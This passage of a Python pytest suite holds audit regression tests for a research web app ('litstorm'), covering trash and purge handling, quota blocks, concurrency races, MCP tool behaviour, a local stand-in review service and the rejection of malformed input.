    run.status, run.started_at, run.finished_at = SUCCEEDED, datetime.now(timezone.utc), datetime.now(timezone.utc)
    db.commit()
    assert user.delete(f"/api/sessions/{run.session_id}").status_code == 204
    again = _mcp_start(token)
    assert again["id"] != started["id"]


@finding("BUG-20")
@pytest.mark.db
def test_bug20_an_administrator_cannot_read_an_integrations_run_that_is_in_a_trashed_session(admin, browser, configured, db):
    """deps.readable's fallback for an integration account's research tests the row's own
    trashed_at, not whether its Session or Project is in the Trash (the owner's path does)."""
    from litstorm import trash
    from litstorm.db.models import ResearchSession, Run

    account = admin.post("/api/admin/integrations", json={"name": "DeepWitya"}).json()
    token = admin.post(f"/api/admin/integrations/{account['id']}/tokens", json={"name": "server", "days": None}).json()["token"]
    started = _mcp_start(token)
    assert admin.get(f"/api/runs/{started['id']}").status_code == 200
    trash.trash_session(db, db.get(ResearchSession, db.get(Run, uuid.UUID(started["id"])).session_id))
    db.commit()
    assert admin.get(f"/api/runs/{started['id']}").status_code == 404


@finding("BUG-21")
@pytest.mark.db
def test_bug21_a_run_whose_files_could_not_be_deleted_is_not_marked_purged(admin, browser, configured, db, monkeypatch):
    """rmtree(ignore_errors=True), then purged_at is set: the next purge skips the Run and the
    directory (report, work/, the Discussion's state) stays on disk for ever, unlogged."""
    import shutil

    from litstorm import settings
    from litstorm.db.models import Project

    user = make_user(admin, browser, "audit-alice@example.org")
    project, _, run = research(user)
    run_fake(db, run["id"])
    run_dir = os.path.join(settings.get().runs_dir, run["id"])
    assert os.path.exists(run_dir)
    assert user.delete(f"/api/projects/{project['id']}").status_code == 204
    age(db, Project, project["id"], days=31)

    def stuck(path, ignore_errors=False, **kwargs):  # a file held open, a read-only mount
        if not ignore_errors:
            raise PermissionError(path)

    monkeypatch.setattr(shutil, "rmtree", stuck)
    purge()
    monkeypatch.undo()
    purged = _state(db, run["id"]).purged_at is not None
    assert not (purged and os.path.exists(run_dir)), "marked purged, files still on disk"


@finding("BUG-22")
@pytest.mark.db
def test_bug22_restoring_a_session_inside_a_trashed_project_is_refused_or_works(admin, browser, configured, db):
    """restore() does not look at the parent: a stale tab's restore of the Session answers 204,
    the Session leaves the Trash's own clock (it can now only be purged with its Project), and
    it is still hidden, because its Project is in the Trash."""
    user = make_user(admin, browser, "audit-alice@example.org")
    project, session, _ = research(user)
    assert user.delete(f"/api/sessions/{session['id']}").status_code == 204
    assert user.delete(f"/api/projects/{project['id']}").status_code == 204
    r = user.post(f"/api/trash/session/{session['id']}/restore")
    visible = user.get(f"/api/sessions/{session['id']}").status_code == 200
    assert r.status_code != 204 or visible, "restore said done (204) and the Session is still hidden"


@finding("BUG-23")
@pytest.mark.db
def test_bug23_listing_topics_does_not_cost_a_query_per_topic(admin, browser, configured, db):
    """_sessions asks for each topic's latest status on its own: 1 + N statements, N up to 500."""
    from sqlalchemy import event

    from litstorm import db as db_mod
    from litstorm.db.models import ResearchSession, User

    user = make_user(admin, browser, "audit-alice@example.org")
    owner = db.query(User).filter_by(email="audit-alice@example.org").one()

    def seed(n):
        db.add_all([ResearchSession(owner_id=owner.id, title=f"topic {uuid.uuid4().hex[:6]}") for _ in range(n)])
        db.commit()

    def statements():
        seen = []
        engine = db_mod.engine()
        hit = lambda *args, **kwargs: seen.append(1)  # noqa: E731
        event.listen(engine, "before_cursor_execute", hit)
        try:
            assert user.get("/api/sessions?limit=500").status_code == 200
        finally:
            event.remove(engine, "before_cursor_execute", hit)
        return len(seen)

    seed(5)
    few = statements()
    seed(40)
    many = statements()
    assert many - few <= 3, f"5 topics took {few} statements, 45 took {many}"


# --- Task 3b: Discussions (Co-STORM Turns) --------------------------------------------------


def _discussion_view(user, discussion_id):
    r = user.get(f"/api/discussions/{discussion_id}")
    assert r.status_code == 200, r.text
    return r.json()


@finding("BUG-24")
@pytest.mark.db
def test_bug24_changing_turns_per_quota_does_not_change_what_a_paid_block_allows(admin, browser, configured, db):
    """The block size is read from the live setting each time (discussion.allowance), not kept with
    the unit the owner paid. Paid for two blocks of 4 and 3 Turns left, the Administrator lowers
    the setting to 2: the same Discussion is "used up" (max(0, 2*2-5) = 0) and the Turns the
    owner paid for are refused until another unit is taken."""
    _limits(admin, turns_per_quota=4)
    user = make_user(admin, browser, "audit-alice@example.org")
    d = _start_discussion(user)
    _finish_turn(db, d["turns"][0]["id"])
    for _ in range(3):  # the rest of the first block of 4
        step = _ask_turn(user, d["id"], action="step")
        assert step.status_code == 201, step.text
        _finish_turn(db, step.json()["id"])
    extended = _ask_turn(user, d["id"], action="step", extend=True)  # takes the second unit
    assert extended.status_code == 201, extended.text
    _finish_turn(db, extended.json()["id"])
    before = _discussion_view(user, d["id"])["allowance"]
    assert before["remaining"] == 3  # 2 blocks of 4, 5 Turns used
    _limits(admin, turns_per_quota=2)
    r = _ask_turn(user, d["id"], action="step")
    assert r.status_code == 201, (r.status_code, r.text, _discussion_view(user, d["id"])["allowance"])


@finding("BUG-25")
@pytest.mark.db
def test_bug25_a_report_that_finished_while_its_owner_pressed_stop_is_listed_with_the_others(admin, browser, configured, db):
    """supervisor.py keeps such a Run's report "for them to read" but records the Turn as
    cancelled; discussion_out lists only succeeded Turns, so a report the owner paid for (the
    unit is not given back) is nowhere on the Discussion page. The Turn here is run through the
    Worker with the fake engine, with Stop already pressed when it starts."""
    from sqlalchemy import update

    from litstorm.db.models import CANCELLING, Run
    from litstorm.worker import main

    user = make_user(admin, browser, "audit-alice@example.org")
    d = _start_discussion(user)
    _finish_turn(db, d["turns"][0]["id"])
    asked = _ask_turn(user, d["id"], action="report")
    assert asked.status_code == 201, asked.text
    turn_id = asked.json()["id"]
    claim = _ready_to_run(db, turn_id, [{"sleep": 1.5}])  # the fake engine ignores Stop, as a Turn nearly done does
    db.execute(update(Run).where(Run.id == claim.run_id).values(status=CANCELLING))
    db.commit()
    main.run_one(claim)
    row = _state(db, turn_id)
    assert (row.status, row.quota_refunded) == ("cancelled", False) and row.report_title  # the report was kept
    listed = [r["run_id"] for r in _discussion_view(user, d["id"])["reports"]]
    assert listed == [turn_id], f"the finished report is not on the page (listed: {listed})"


@finding("BUG-26")
@pytest.mark.db
def test_bug26_a_turn_in_a_discussion_is_refused_once_the_mode_is_switched_off(admin, browser, configured, db):
    """start() checks modes.offered; ask() (and new_turn, which retry() uses too) does not look
    at it again, as new_run does for every Run of the other modes. The Administrator's switch
    stops new Discussions and nothing else."""
    user = make_user(admin, browser, "audit-alice@example.org")
    d = _start_discussion(user)
    _finish_turn(db, d["turns"][0]["id"])
    assert admin.put("/api/admin/engines/co-storm", json={"enabled": False}).status_code == 200
    assert user.post("/api/discussions", json={"topic": "Songkran and tourism", "language": "th"}).status_code == 422
    r = _ask_turn(user, d["id"], action="step")
    assert r.status_code == 422 and r.json()["detail"] == "engine_not_available", (r.status_code, r.text)


@finding("BUG-27")
@pytest.mark.db
def test_bug27_a_long_topic_is_researched_whole_or_refused(admin, browser, configured, db):
    """DiscussionIn accepts 500 characters; the Discussion's title is cut at 300 and the Turn
    takes its topic from that title, so what Co-STORM researches is the first 300 characters
    of the question, cut wherever they end (a STORM Run keeps the whole topic)."""
    topic = " ".join(f"question{i:03d}" for i in range(40))[:450]
    assert 300 < len(topic) <= 500
    d = _start_discussion(make_user(admin, browser, "audit-alice@example.org"), topic=topic)
    asked = d["turns"][0]["topic"]
    assert asked == topic, f"the topic was {len(topic)} characters and the Turn researches {len(asked)}"


# --- Task 3b: System status, accounts and signing in ----------------------------------------

from test_monitor import ended as _ended_run  # noqa: E402
from test_monitor import started as _started_run  # noqa: E402


@finding("BUG-28")
@pytest.mark.db
def test_bug28_two_administrators_acknowledging_at_once_keep_both_acknowledgements(admin, db, monkeypatch):
    """acknowledge() reads the one `monitor.acks` row, then writes it back whole, with no lock:
    the barrier sits between the read and the write, and the second commit replaces the
    first's. Both Administrators got 204; one acknowledgement is gone and its Issue is open."""
    from litstorm import monitor

    assert admin.post("/api/admin/monitor/acknowledge", json={"keys": ["first:seen"]}).status_code == 204  # the row exists
    _meet_at(monkeypatch, monitor, "_now", after=False)
    results = _together(
        lambda: admin.post("/api/admin/monitor/acknowledge", json={"keys": ["issue:a"]}),
        lambda: admin.post("/api/admin/monitor/acknowledge", json={"keys": ["issue:b"]}),
    )
    assert [r.status_code for r in results if not isinstance(r, Exception)] == [204, 204], results
    assert {"issue:a", "issue:b"} <= set(monitor.acks(db))


@finding("BUG-28")
@pytest.mark.db
def test_bug28_the_very_first_two_acknowledgements_at_once_do_not_end_in_a_500(admin, db, monkeypatch):
    """With no row yet, both requests add it and one commit fails on the primary key: an
    unhandled IntegrityError, the page's "Acknowledge" answered with a 500."""
    from litstorm import monitor

    _meet_at(monkeypatch, monitor, "_now", after=False)
    results = _together(
        lambda: admin.post("/api/admin/monitor/acknowledge", json={"keys": ["issue:a"]}),
        lambda: admin.post("/api/admin/monitor/acknowledge", json={"keys": ["issue:b"]}),
    )
    assert [r.status_code for r in results if not isinstance(r, Exception)] == [204, 204], results
    assert {"issue:a", "issue:b"} <= set(monitor.acks(db))


@finding("BUG-29")
@pytest.mark.db
def test_bug29_runs_waiting_for_an_account_that_was_turned_off_do_not_stay_in_the_queue(admin, browser, configured, db):
    """The Worker never claims a deactivated owner's Run (queue._next_run), and turning the
    account off does nothing else to it: the Run stays `queued` (its quota reserved) and System
    status counts it as waiting, with an oldest-wait that only grows, until the account is
    turned on again (when it suddenly starts)."""
    from litstorm import monitor

    user = make_user(admin, browser, "audit-alice@example.org")
    research(user)
    owner = user.get("/api/me").json()["id"]
    assert admin.patch(f"/api/admin/users/{owner}", json={"is_active": False}).status_code == 200
    assert _claim_one() is None  # nothing is started for it
    waiting = monitor.queue(db)
    assert waiting["queued"] == 0, f"System status still counts the queued Run: {waiting}"


@finding("BUG-30")
@pytest.mark.db
@pytest.mark.parametrize("field", ["is_active", "name", "role"])
def test_bug30_an_account_patched_with_an_explicit_null_is_refused_not_a_500(admin, browser, db, field):
    """UserPatch lets null through for every field (it is meant for the three quota ones, where
    null clears an override) and patch_user sets each one: a NOT NULL column, an IntegrityError
    nobody catches."""
    user = make_user(admin, browser, "audit-alice@example.org")
    owner = user.get("/api/me").json()["id"]
    try:
        outcome = admin.patch(f"/api/admin/users/{owner}", json={field: None}).status_code
    except Exception as error:  # noqa: BLE001 - the 500 the page would have been given
        outcome = type(error).__name__
    assert outcome == 422, f"PATCH {{{field!r}: null}} answered {outcome}"


@finding("BUG-30")
@pytest.mark.db
def test_bug30_an_account_cannot_be_given_a_blank_name(admin, browser, db):
    """create_user strips the name; patch_user stores what it is given: only spaces pass
    min_length=1 and the account is shown as nobody."""
    user = make_user(admin, browser, "audit-alice@example.org")
    owner = user.get("/api/me").json()["id"]
    r = admin.patch(f"/api/admin/users/{owner}", json={"name": "   "})
    assert r.status_code == 422 or r.json()["name"].strip(), f"stored name {r.json()['name']!r}"


@finding("BUG-30")
@pytest.mark.db
@pytest.mark.parametrize("field", ["is_active", "name"])
def test_bug30_an_integration_patched_with_an_explicit_null_is_refused_not_a_500(admin, db, field):
    """IntegrationPatch has the same optional fields over the same NOT NULL columns
    (monthly_run_quota: null is meant, and works)."""
    account = admin.post("/api/admin/integrations", json={"name": "DeepWitya"}).json()
    try:
        outcome = admin.patch(f"/api/admin/integrations/{account['id']}", json={field: None}).status_code
    except Exception as error:  # noqa: BLE001
        outcome = type(error).__name__
    assert outcome == 422, f"PATCH {{{field!r}: null}} answered {outcome}"


@finding("BUG-31")
@pytest.mark.db
def test_bug31_signed_in_browsers_that_expired_are_cleaned_up(admin, browser, db, one_pass):
    """Every sign-in adds an auth_sessions row for 14 days and nothing ever deletes it:
    deps only ignores an expired row. After a later sign-in and a pass of the Worker (which
    does the other housekeeping), the expired rows are still there."""
    from datetime import datetime, timedelta, timezone

    from litstorm.db.models import AuthSession, User

    make_user(admin, browser, "audit-alice@example.org", password="the audit password 1")
    owner = db.query(User).filter_by(email="audit-alice@example.org").one()
    db.add_all([
        AuthSession(token_hash=uuid.uuid4().hex + uuid.uuid4().hex[:32], user_id=owner.id, csrf_token="x",
                    expires_at=datetime.now(timezone.utc) - timedelta(days=1 + i))
        for i in range(3)
    ])
    db.commit()
    signed_in = browser().post("/api/auth/login", json={"email": "audit-alice@example.org", "password": "the audit password 1"})
    assert signed_in.status_code == 200
    one_pass()
    db.expire_all()
    expired = db.query(AuthSession).filter(AuthSession.expires_at < datetime.now(timezone.utc)).count()
    assert expired == 0, f"{expired} expired sign-ins are still stored"


@finding("BUG-32")
@pytest.mark.db
def test_bug32_a_short_topic_does_not_split_one_failure_into_two_issues(admin, browser, configured, db):
    """monitor._said replaces the topic wherever it occurs as text, inside words too, and the
    result is part of the Issue's key: the same provider message, from a Run whose topic is
    "limit" and from one about "weather", is two Issues (and "Rate limit" reads "Rate ...")."""
    said = "litellm.RateLimitError: rate limit reached for key"
    alice = make_user(admin, browser, "audit-alice@example.org")
    for topic in ("limit", "weather"):
        _ended_run(db, _started_run(alice, topic), reason="retries_exhausted", message=said, engine="storm")
    issues = admin.get("/api/admin/monitor").json()["issues"]
    assert [i["count"] for i in issues] == [2], [(i["count"], i["message"]) for i in issues]


@finding("BUG-33")
@pytest.mark.db
def test_bug33_words_of_the_topic_do_not_decide_why_an_engine_error_is_filed(admin, browser, configured, db):
    """monitor._reason runs outcomes.from_message over the whole message of an engine_error:
    a fault in our code that quotes a topic about "rate limit policy" is filed as a provider
    that kept refusing (retries_exhausted), and the Administrator chases a provider that is fine."""
    alice = make_user(admin, browser, "audit-alice@example.org")
    topic = "rate limit policy"
    _ended_run(db, _started_run(alice, topic), reason="engine_error", engine="storm",
               message=f"KeyError: could not find a section for '{topic}'")
    issues = admin.get("/api/admin/monitor").json()["issues"]
    assert [i["reason"] for i in issues] == ["engine_error"]


@finding("BUG-34")
@pytest.mark.db
def test_bug34_one_fault_with_different_ids_in_its_words_is_one_issue(admin, browser, configured, db):
    """The Issue's key turns digits into "#" but not hex letters: a message with a request or
    run id (ab12cd34, ef56ab78) is a new Issue for every Run, and one acknowledgement covers
    one occurrence."""
    alice = make_user(admin, browser, "audit-alice@example.org")
    for ident in ("ab12cd34", "ef56ab78", "cd90ef12"):
        _ended_run(db, _started_run(alice), reason="bad_configuration", engine="storm",
                   message=f"RuntimeError: request {ident} refused")
    issues = admin.get("/api/admin/monitor").json()["issues"]
    assert [i["count"] for i in issues] == [3], [(i["count"], i["message"]) for i in issues]


@finding("BUG-34")
@pytest.mark.db
def test_bug34_two_different_faults_with_the_same_first_words_are_two_issues(admin, browser, configured, db):
    """Only the first 40 characters of the message are in the key: two BadRequests of one model
    that differ after them (which is what tells them apart) share an Issue and an acknowledgement."""
    alice = make_user(admin, browser, "audit-alice@example.org")
    for cause in ("model a/m is not available in your region", "reasoning is not supported by this model"):
        _ended_run(db, _started_run(alice), reason="bad_configuration", engine="storm",
                   message=f"litellm.BadRequestError: OpenrouterException - {cause}")
    issues = admin.get("/api/admin/monitor").json()["issues"]
    assert len(issues) == 2, [(i["count"], i["message"]) for i in issues]


@finding("BUG-35")
@pytest.mark.db
def test_bug35_a_set_password_link_can_be_used_once_even_by_two_at_the_same_moment(admin, browser, db, monkeypatch):
    """set_password reads the link, then deletes it with no lock on its row: two requests with
    one token both pass the check (the barrier sits right after it) and both set a password and
    both sign in; the second DELETE finds nothing and only warns."""
    from litstorm import security

    link = admin.post("/api/admin/users", json={"email": "audit-alice@example.org", "name": "U"}).json()["link"]
    token = link.split("#", 1)[1]
    _meet_at(monkeypatch, security, "hash_password", after=False)
    first, second = browser(), browser()
    results = _together(
        lambda: first.post("/api/auth/password", json={"token": token, "password": "the first password 1"}),
        lambda: second.post("/api/auth/password", json={"token": token, "password": "the second password 2"}),
    )
    outcome = sorted(str(type(r).__name__ if isinstance(r, Exception) else r.status_code) for r in results)
    assert outcome == ["200", "410"], f"one link used twice at once answered {outcome}"


@finding("BUG-36")
@pytest.mark.db
def test_bug36_an_integration_account_is_not_patched_through_the_people_endpoint(admin, db):
    """reset_link and delete_user answer 404 for an integration account ("it has a page of its
    own", api/tokens.py); patch_user has no such check, and gives it the role admin."""
    from litstorm.db.models import User

    account = admin.post("/api/admin/integrations", json={"name": "DeepWitya"}).json()
    r = admin.patch(f"/api/admin/users/{account['id']}", json={"role": "admin"})
    db.expire_all()
    role = db.get(User, uuid.UUID(account["id"])).role
    assert r.status_code == 404 and role == "user", (r.status_code, role)


# --- Task 3b: Discussions, the rest ---------------------------------------------------------


@finding("BUG-37")
@pytest.mark.db
def test_bug37_a_request_key_used_again_for_another_discussion_does_not_hand_back_the_first_turn(admin, browser, configured, db):
    """_existing looks a request_key up by owner only: a key that already made a Turn of
    Discussion A, sent with a different Turn for Discussion B, is answered 201 with A's Turn and
    B is asked nothing. (The web app sends no key with a Turn, and a new key with each start; this
    is for API and MCP clients.)"""
    user = make_user(admin, browser, "audit-alice@example.org")
    first = _start_discussion(user)
    _finish_turn(db, first["turns"][0]["id"])
    second = _start_discussion(user)
    _finish_turn(db, second["turns"][0]["id"])
    a = _ask_turn(user, first["id"], action="step", request_key="same-key")
    assert a.status_code == 201, a.text
    b = _ask_turn(user, second["id"], action="say", text="What about prices?", request_key="same-key")
    assert b.status_code >= 400 or b.json()["session_id"] == second["id"], (
        f"asked of Discussion B, answered with Discussion A's Turn: {b.json()['turn']}"
    )


@finding("BUG-38")
@pytest.mark.slow
def test_bug38_two_snippets_of_one_page_cited_together_are_one_citation(tmp_path):
    """report_files gives every snippet of a page the page's lowest number, and rewrites each
    [n] on its own: a model that cites both snippets of one page, "[4][9]", is left with "[1][1]"
    in the report the owner exports."""
    from litstorm.engines.costorm import engine
    from litstorm.engines.storm import normalize
    from test_costorm_engine import _info, _runner

    runner = _runner([
        _info("https://a.test", "A", ["first passage"], 4),
        _info("https://b.test", "B", ["other"], 5),
        _info("https://a.test", "A", ["second passage"], 9),
    ])
    engine.report_files(runner, "# Intro\n\nA claim [4][9].\n\n# History\n\nOld [9][5].", str(tmp_path))
    report, _ = normalize.normalize(str(tmp_path), "x", "en")
    bodies = [report["lead"], *(s["body"] for s in report["sections"])]
    doubled = [b for b in bodies if re.search(r"(\[\d+\])\1", b)]
    assert not doubled, f"the same citation twice in a row: {doubled}"


# --- Task 3b: MCP, tokens and the engines -----------------------------------------------------

from test_deep_engine import engine  # noqa: E402,F401 - a fixture


@finding("BUG-39")
@pytest.mark.db
def test_bug39_starting_again_after_cancelling_does_not_hand_back_the_run_being_cancelled(admin, browser, configured, db):
    """_repeat_of leaves out failed, cancelled and interrupted Runs but not `cancelling`, which
    lasts until the child stops (up to 30 s): the agent that cancels and asks again is told
    "this is that run, no quota used", and a few seconds later that run is cancelled."""
    from datetime import datetime, timezone

    from litstorm.db.models import RUNNING, Run

    user = make_user(admin, browser, "audit-alice@example.org")
    token = _token(user)
    started = _mcp_start(token)
    run = db.get(Run, uuid.UUID(started["id"]))
    run.status, run.started_at = RUNNING, datetime.now(timezone.utc)
    db.commit()
    stopped = user.post(f"/api/runs/{started['id']}/cancel")
    assert stopped.status_code == 200 and stopped.json()["status"] == "cancelling", stopped.text
    again = _mcp_start(token)
    assert again["id"] != started["id"], "started again, handed the run that is being cancelled"


class _MiniMRA:
    """A stand-in MRA whose answers a test lists, in order (the last repeats): what each
    POST /reviews does, what the event stream sends, and what GET /reviews/{id} says."""

    ID = "11111111-2222-3333-4444-555555555555"

    def __init__(self, post=None, events=None, review=None):
        from test_medical import EVENTS, RESULT

        self.post = list(post or [(0, 202, {"review_id": self.ID, "cached": False})])
        self.events = list(events or [(200, EVENTS)])
        self.review = list(review or [(200, {"id": self.ID, "status": "done", "cost_usd": 0.0421, "result": RESULT})])
        self.posted, self.streamed, self.fetched = 0, 0, 0

    @staticmethod
    def _next(items):
        return items.pop(0) if len(items) > 1 else items[0]

    def serve(self):
        import http.server
        import time
        from urllib.parse import parse_qs, urlparse

        mra = self

        class Handler(http.server.BaseHTTPRequestHandler):
            def _send(self, code, body, kind="application/json"):
                data = body if isinstance(body, bytes) else json.dumps(body).encode()
                self.send_response(code)
                self.send_header("Content-Type", kind)
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)

            def do_POST(self):  # noqa: N802
                self.rfile.read(int(self.headers["Content-Length"]))
                mra.posted += 1
                delay, code, body = mra._next(mra.post)
                time.sleep(delay)
                try:
                    self._send(code, body)
                except OSError:
                    pass  # the client gave up waiting

            def do_GET(self):  # noqa: N802
                url = urlparse(self.path)
                if url.path.endswith("/events"):
                    mra.streamed += 1
                    code, frames = mra._next(mra.events)
                    if code != 200:
                        return self._send(code, {"detail": "no"})
                    since = int(parse_qs(url.query).get("since", ["0"])[0])
                    text = "".join(f"id: {i}\nevent: {kind}\ndata: {json.dumps(data)}\n\n"
                                   for i, (kind, data) in enumerate(frames, 1) if i > since)
                    return self._send(200, text.encode(), "text/event-stream")
                if url.path == f"/api/v1/reviews/{mra.ID}":
                    mra.fetched += 1
                    code, body = mra._next(mra.review)
                    return self._send(code, body)
                if url.path == f"/r/{mra.ID}/report.html":
                    return self._send(200, b"<!doctype html>", "text/html")
                self._send(404, {"detail": "not found"})

            def log_message(self, *args):
                pass

        server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        threading.Thread(target=server.serve_forever, daemon=True).start()
        self.url = f"http://127.0.0.1:{server.server_port}"
        self.server = server
        return self


@pytest.fixture
def mini_mra(monkeypatch):
    from litstorm.engines.medical import engine

    monkeypatch.setattr(engine, "_sleep", lambda seconds, cancel: None)  # the waits between tries
    made = []

    def make(**answers):
        made.append(_MiniMRA(**answers).serve())
        return made[-1]

    yield make
    for mra in made:
        mra.server.shutdown()
        mra.server.server_close()


def _review(mra, tmp_path, **service):
    """MedicalEngine against `mra`: ("report", report) or (the exception, None)."""
    from test_medical import _run

    try:
        report, progress = _run(mra, tmp_path, **service)
        return report, progress
    except Exception as error:  # noqa: BLE001 - what the Worker would have ended the Run with
        return error, None


@finding("BUG-40")
def test_bug40_a_blip_when_the_stream_closed_early_does_not_fail_a_review_mra_is_still_running(mini_mra, tmp_path):
    """_follow retries a dropped stream but not the GET that asks what became of the review when
    a stream closes without an ending: an MRA that is restarting answers 503 once and the Run
    ends engine_error (HTTPStatusError), though the review goes on (and a retry gets it cached)."""
    from test_medical import EVENTS, RESULT

    done = (200, {"id": _MiniMRA.ID, "status": "done", "cost_usd": 0.0421, "result": RESULT})
    mra = mini_mra(
        events=[(200, EVENTS[:5]), (200, EVENTS)],  # closes after 5 events, then the whole story
        review=[(503, {"detail": "restarting"}), done],
    )
    outcome, _ = _review(mra, tmp_path)
    assert not isinstance(outcome, Exception), f"the Run ended with {type(outcome).__name__}: {outcome}"


@finding("BUG-40")
def test_bug40_a_blip_on_the_final_fetch_does_not_throw_away_a_review_that_is_done(mini_mra, tmp_path):
    """The review is done and the GET that fetches its result is not retried: one 503 and the
    paid-for review is lost to the Run (engine_error)."""
    from test_medical import RESULT

    mra = mini_mra(review=[(503, {"detail": "restarting"}), (200, {"id": _MiniMRA.ID, "status": "done",
                                                                    "cost_usd": 0.0421, "result": RESULT})])
    outcome, _ = _review(mra, tmp_path)
    assert not isinstance(outcome, Exception), f"the Run ended with {type(outcome).__name__}: {outcome}"


@finding("BUG-40")
def test_bug40_a_refused_key_on_the_stream_is_not_reported_as_an_mra_that_went_quiet(mini_mra, tmp_path):
    """A 401 on the event stream (the key was rotated while the review ran) is retried six
    times like an outage and reported as service_unavailable; the submit says
    bad_configuration for the same 401."""
    mra = mini_mra(events=[(401, None)])
    outcome, _ = _review(mra, tmp_path)
    assert getattr(outcome, "reason", None) == "bad_configuration", f"{type(outcome).__name__}: {outcome}"


@finding("BUG-41")
def test_bug41_a_review_started_by_the_run_itself_is_not_given_back_as_free(mini_mra, tmp_path, monkeypatch):
    """MRA took longer than the read timeout to answer the first POST (it had accepted the
    review and started paying for it); the retry is answered `cached: true` with the same
    review. The Run is then treated as one that cost nothing: "service_cache" noted, its price
    recorded as 0 and its quota given back (worker.queue.finish)."""
    import httpx

    from litstorm.engines.medical import engine
    from test_medical import EVENTS

    monkeypatch.setattr(engine, "TIMEOUT", httpx.Timeout(connect=5.0, read=0.5, write=5.0, pool=5.0))
    mra = mini_mra(post=[(1.5, 202, {"review_id": _MiniMRA.ID, "cached": False}),
                         (0, 202, {"review_id": _MiniMRA.ID, "cached": True})])
    outcome, progress = _review(mra, tmp_path)
    assert not isinstance(outcome, Exception), f"{type(outcome).__name__}: {outcome}"
    assert mra.posted == 2  # it did ask twice
    kinds = [k for k, _ in progress.notes]
    assert "service_cache" not in kinds and progress.usages == [0.0421], (kinds, progress.usages)


@finding("BUG-42")
def test_bug42_an_outcome_without_a_quote_does_not_lose_the_review():
    """convert.to_report calls .strip() on `evidence_quote` taken with .get(key, ""), which
    defaults a missing key only: an outcome whose quote is null (MRA's own stub cards have
    them) raises AttributeError out of the Engine after the review was paid for."""
    from litstorm import report as report_mod
    from litstorm.engines.medical.convert import to_report
    from test_medical import RESULT

    papers = [{**RESULT["papers"][0], "card": {"study_design": "RCT", "outcomes": [{"evidence_quote": None}]}},
              *RESULT["papers"][1:]]
    try:
        report = to_report({"result": {**RESULT, "papers": papers}}, "en", "drug X and Z")
    except Exception as error:  # noqa: BLE001
        report = None
        failure = f"{type(error).__name__}: {error}"
    assert report is not None, failure
    report_mod.validate(report)


@finding("BUG-43")
def test_bug43_a_stop_is_noticed_while_the_deep_cli_keeps_talking(engine, tmp_path):
    """DeepEngine checks for a stop only when the CLI has been quiet for a second, and at a
    stage change. A CLI that writes a line every 50 ms for 8 s (the research tree growing) is
    not stopped until it has finished; the supervisor kills it after its 30 s grace instead."""
    import time

    from test_deep_engine import Cancel, run

    from litstorm.engines.base import Cancelled

    cancel = Cancel()
    threading.Timer(1.0, cancel.asked.set).start()
    started = time.monotonic()
    try:
        run(engine, tmp_path, "stream", cancel=cancel)
        outcome = "finished"
    except Cancelled:
        outcome = "cancelled"
    waited = time.monotonic() - started
    assert outcome == "cancelled" and waited < 4, f"asked to stop after 1 s: {outcome} after {waited:.1f} s"


def _nested_report():
    return {
        "title": "T", "language": "en", "lead": "",
        "sections": [
            {"id": "s1", "heading": "Background", "body": "First [1].", "children": []},
            {"id": "s2", "heading": "Methods", "body": "Second.", "children": [
                {"id": "s2a", "heading": "Search", "body": "Nested text [1].", "children": []}]},
        ],
        "sources": [{"id": 1, "url": "https://a.test", "title": "A", "evidence": []}],
    }


@finding("BUG-44")
def test_bug44_every_section_number_the_outline_prints_can_be_read():
    """_outline numbers nested sections ("2.1. Search") and tells the model to ask for part
    'section:N'; _section takes only a top-level number or a top-level heading, and answers
    "No section '2.1'" for a number the outline just printed."""
    from litstorm.api import mcp

    report = _nested_report()
    assert "2.1. Search" in mcp._outline(report)
    try:
        text = mcp._section(report, "2.1")
    except Exception as error:  # noqa: BLE001
        text = f"{type(error).__name__}: {error}"
    assert "Nested text" in text, text


@finding("BUG-44")
def test_bug44_a_section_number_that_is_not_a_number_is_told_so():
    """str.isdigit() is true for "²" and "٣": int() then raises ValueError instead of the
    ToolError the tool gives for any other section it cannot find."""
    from mcp.server.fastmcp.exceptions import ToolError

    from litstorm.api import mcp

    for wanted in ("²", "٣"):
        try:
            mcp._section(_nested_report(), wanted)
            raised = None
        except Exception as error:  # noqa: BLE001
            raised = error
        assert isinstance(raised, ToolError), f"section {wanted!r}: {type(raised).__name__}"


# --- BUG-53: a search service that does not answer reads as "no sources for this topic" ---


@finding("BUG-53")
def test_bug53_a_search_service_that_cannot_be_reached_counts_as_refusing():
    """SearXNG.forward catches every exception, logs it and returns []. `refused` stays 0, so the
    Engine says "no sources for this topic" (empty_report, a watch item, not an open Issue) instead of
    "the search provider refused N searches" (live: Run 5c48bf01 on the audit stack)."""
    from knowledge_storm.rm import SearXNG

    rm = SearXNG(searxng_api_url="http://127.0.0.1:1/search")  # nothing listens on port 1
    assert rm.forward("sleep and memory") == []
    assert rm.refused >= 1, "the failed search was not counted, so the Run cannot say the service was down"


# --- Task 7: limits and odd inputs -----------------------------------------------------------

NUL = "\u0000"
LONE_SURROGATE = "\ud800"  # legal in a JSON string ("\ud800"), but not in UTF-8


def _answered(call):
    """(status, None) for a response; (None, error) when the app raised instead of answering with 422
    (a TestClient re-raises the 500 the real server would send)."""
    try:
        return call().status_code, None
    except Exception as error:  # noqa: BLE001
        return None, f"{type(error).__name__}: {str(error)[:80]}"


@finding("BUG-54")
@pytest.mark.db
@pytest.mark.parametrize("bad", [NUL, LONE_SURROGATE], ids=["nul", "lone-surrogate"])
def test_bug54_a_character_the_database_cannot_hold_is_refused_not_a_500(admin, browser, configured, bad):
    """A NUL or a lone surrogate passes every length check and then breaks the INSERT (Postgres text
    cannot hold NUL; UTF-8 cannot encode a surrogate): the User gets a 500, from the topic, a Project's
    name, request_key, a section, a refinement answer, or a Project's search_scope / writing_style.
    Live on the audit stack: POST /sessions and POST /projects, all 500 "Internal Server Error"."""
    user = make_user(admin, browser, "audit-odd@example.org")
    project = user.post("/api/projects", json={"name": "P"}).json()
    base = {"language": "th", "topic": "a valid topic"}
    attempts = {
        "topic": lambda: user.post("/api/sessions", json={**base, "topic": f"ab{bad}cd"}),
        "project name": lambda: user.post("/api/projects", json={"name": f"a{bad}b"}),
        "request_key": lambda: user.post("/api/sessions", json={**base, "request_key": f"k{bad}"}),
        "section": lambda: user.post("/api/sessions", json={**base, "sections": [f"a{bad}b"]}),
        "refinement": lambda: user.post("/api/sessions", json={**base, "refinement": [{"question": "q", "answer": f"a{bad}"}]}),
        "search_scope": lambda: user.patch(f"/api/projects/{project['id']}", json={"search_scope": f"a{bad}"}),
    }
    broke = {}
    for name, call in attempts.items():
        status, error = _answered(call)
